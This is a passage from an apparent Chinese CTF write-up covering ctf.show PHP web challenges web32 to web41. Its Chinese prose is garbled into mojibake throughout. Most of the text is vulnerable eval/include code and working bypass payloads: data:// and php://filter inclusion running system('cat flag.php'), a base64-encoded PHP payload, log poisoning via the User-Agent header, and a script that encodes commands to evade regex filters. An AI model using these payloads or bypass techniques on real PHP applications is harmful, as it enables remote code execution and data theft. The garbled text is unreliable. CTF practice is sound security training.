punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·ã€echoæ²¡äº†</p><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><p>includeå¯ä»¥ä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨?&gt;ä»£æ›¿</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯å¤šäº†ä¸€ä¸ªåŒå¼•å·</p><h3 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†ï¼š&lt;=/æ•°å­—</p><h3 id="payloadï¼š-2"><a href="#payloadï¼š-2" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>a<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat flag.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payloadï¼š-3"><a href="#payloadï¼š-3" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?php system('cat fla?.php');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="éªšå§¿åŠ¿ï¼šé…åˆUAå¤´ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š"><a href="#éªšå§¿åŠ¿ï¼šé…åˆUAå¤´ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š" class="headerlink" title="éªšå§¿åŠ¿ï¼šé…åˆUAå¤´ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š"></a>éªšå§¿åŠ¿ï¼šé…åˆUAå¤´ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š</h3><pre><code>GET /?file=/var/log/nginx/access.log HTTP/1.1Host: 5f1578cc-e37e-47a9-9345-0d1bd3b90c8e.challenge.ctf.show:8080Upgrade-Insecure-Requests: 1User-Agent: &lt;?=`tac f*`?&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: __cfduid=da172a34e9b16f1e15ed1c229eea973741619340401Connection: close</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|file|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤šè¿‡æ»¤äº†phpå’Œfileï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨dataåè®®ä¸è¿‡æ˜¯base64ç¼–ç æˆ–è€…ç”¨<code>&lt;?= ?&gt;</code>æ¥ä»£æ›¿php</p><h3 id="payloadï¼š-4"><a href="#payloadï¼š-4" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/palin,&lt;?=system('cat fla?.???');?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¹å˜åœ¨ç¬¬ä¸ƒè¡Œï¼Œç»™$cè¿æ¥äº†ä¸€ä¸ª.phpï¼Œä»–è¿™ä¹ˆåšçš„ç›®æˆ‘æ²¡æœ‰getåˆ°ï¼Œåˆ©ç”¨ä¸Šä¸€é“é¢˜ç›®çš„payloadæ¥ç€æ‰“å°±å¯ä»¥äº†</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>okï¼Œç»†èŠ‚é—®é¢˜ï¼Œå‡ºé¢˜äººè™½ç„¶è¿‡æ»¤äº†æ‹¬å·ä½†æ˜¯ï¼Œå´åªæ˜¯è¿‡æ»¤äº†ä¸­æ–‡ç‰ˆçš„æ‹¬å·ï¼Œæ‰€ä»¥å½“æˆå¥—å¨ƒé¢˜ç›®åšå°±å¯ä»¥äº†</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>each() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€æ­¥</li><li>end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</li><li>next() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½</li><li>prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›ä¸€ä½</li><li>array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</li><li>localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</li><li>pos()ï¼šè¿”å›æ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼</li><li>scandir()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</li><li>array_reverse()ï¼šå°†æ•°ç»„é€†åºæ’åˆ—</li><li>next()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€å…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>print_r(scandir(â€˜.â€™)); æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å</li><li>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«å</li></ul><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo($c);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ç¬¬6è¡Œçš„å˜åŒ–ï¼Œä»¥åŠä¼ å‚å½¢å¼å˜ä¸ºpostç±»å‹ï¼ŒåŒæ—¶è€ƒè™‘|è¿ç®—ç¬¦</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank" rel="noopener">æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰</a></p><p>ç”¨4ğŸ‘´çš„è„šæœ¬ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*/</span><span class="token comment" spellcheck="true">//æˆ–</span><span class="token keyword">function</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//å¼‚æˆ–</span><span class="token keyword">function</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//å–å</span><span class="token keyword">function</span> <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'[*] (~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">')(~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">');'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//mode=1ä»£è¡¨æˆ–ï¼Œ2ä»£è¡¨å¼‚æˆ–ï¼Œ3ä»£è¡¨å–å</span><span class="token comment" spellcheck="true">//å–åçš„è¯ï¼Œå°±æ²¡å¿…è¦ç”Ÿæˆå­—ç¬¦å»è·‘äº†ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œç›´æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</span><span class="token keyword">function</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span><span class="token operator">=</span><span class="token string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> 